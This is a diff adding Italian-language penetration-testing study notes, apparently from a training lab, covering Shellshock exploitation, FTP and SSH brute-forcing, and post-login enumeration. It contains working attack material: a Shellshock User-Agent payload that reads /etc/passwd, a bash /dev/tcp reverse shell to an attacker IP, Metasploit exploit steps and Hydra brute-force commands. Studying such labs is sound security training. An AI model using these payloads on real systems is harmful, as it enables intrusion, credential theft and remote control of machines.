@@ -822,3 +822,114 @@ crackmapexec smb 10.2.28.132 -u Administrator -H <NTLM_Hash> -x "net user admini
 * Disabilitare memorizzazione LM e usare policy forti.
 * Monitorare tentativi SMB e movimenti laterali.
 * Utilizzare MFA e credenziali gestite (LAPS).
+
+## Exploiting Linux Vulnerabilities
+
+### Vulnerability Analysis: Shellshock (CVE-2014-6271) - Apache e Bash
+
+Vulnerabilità Linux:  **() { :; }; echo; echo; /bin/bash -c '\<comando da eseguire>'**
+
+#### Identificare se un server è vulnerabile a Shellshock
+
+```
+nmap -sV 192.24.241.3
+nmap -sV 192.24.241.3 --script=http-shellshock --script-args "http-shellshock.uri=/gettime.cgi" //dobbiamo per forza inserre come argomento il percorso per lo script cgi
+```
+
+Es. il countdown presente nella home di un sito è fatto con CGI, ed è possibile verificarlo guardando il sorgente della pagina.
+
+#### Exploit manuale per Shellshock
+
+1. Attiviamo il redirect del traffico da mozilla firefox al proxy di Burp Suite con l'add-on presente qui sopra.
+2. Apriamo Burp Suite
+3. Aggiorniamo la pagina con lo script cgi in modo che venga intercettata la richiesta all'interno di Burp Suite, la inviamo a Repeater e la modifichiamo.
+4. Sostituiamo User-Agent con i nostri caratteri speciali **() { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'**
+5. Effettivamente possiamo vedere che nella risposta troviamo il contenuto del file passwd, e quindi possiamo identificare i vari utenti come ad esempio nobody.
+
+#### Per ottenere una reverse shell
+
+1. Apriamo una porta con il listener netcat: nc -nvlp 1234
+2. Apriamo poi Burp Suite e cambiamo il comando specificato nell'user agent con: **'bash -i>&/dev/tcp/KALI LINUX IP/PORT 0>&1'**
+3. Provare la reverse shell nel listener con: **uname -a**
+
+#### Exploit automatico con MSF
+
+```
+msfconsole
+search shellshock
+use exploit/multi/http/apache_mod_cgi_bash_env_exec
+show options
+set RHOSTS 192.24.241.3
+set TARGETURI /gettime.cgi
+exploit
+```
+
+Per testare se è vulnerabile a shellshock usare: **auxiliary/scanner/http/apache\_mod\_cgibash\_env**
+
+### Exploiting FTP
+
+#### Verificare se l'accesso anonimo è abilitato tentando la connessione
+
+```
+ftp 192.93.66.3 //e usiamo anonymous come username e lasciamo vuota la password
+```
+
+#### Verifichiamo anonymous access via NMAP script
+
+```
+ls -al /usr/share/nmap/scripts/ | grep ftp-*
+nmap -sV 192.93.66.3 --script=ftp-anon
+```
+
+#### Bruteforce con hydra
+
+```
+hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 192.93.66.3 -t 4 ftp
+```
+
+#### Bruteforce password di un utente specifico con nmap script
+
+Find the password of user “sysadmin” using nmap script.
+
+```
+echo "sysadmin" > users
+nmap --script ftp-brute --script-args userdb=/root/users -p 21 demo.ine.local
+```
+
+#### Tentiamo il login con le credenziali trovate
+
+```
+ftp 192.93.66.3 // e inseriamo le credenziali, ad es. di sysadmin
+```
+
+#### Verifica esistenza exploit per versione di ProFTP in esecuzione sul target
+
+```
+searchsploit ProFTPd
+```
+
+### Exploiting SSH
+
+#### Verifichiamo con nmap se ssh è attivo e raggiungibile
+
+```
+nmap -sV 192.156.211.3
+```
+
+#### Bruteforce SSH con Hydra <a href="#bruteforce-ssh-con-hydra" id="bruteforce-ssh-con-hydra"></a>
+
+```
+hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/common_passwords.txt 192.156.211.3 -t 4 ssh
+```
+
+#### Login SSH con le credenziali trovate <a href="#login-ssh-con-le-credenziali-trovate" id="login-ssh-con-le-credenziali-trovate"></a>
+
+```
+ssh sysadmin@192.156.211.3 //e inseriamo la password hailey
+whoami
+groups sysadmin //se fa parte del gruppo sudo vuol dire che ha dei permessi elevati
+cat /etc/*issue //per trovare la versione del SO
+uname -r //per mostrare la versione del kernel
+```
+
+### Exploiting SAMBA
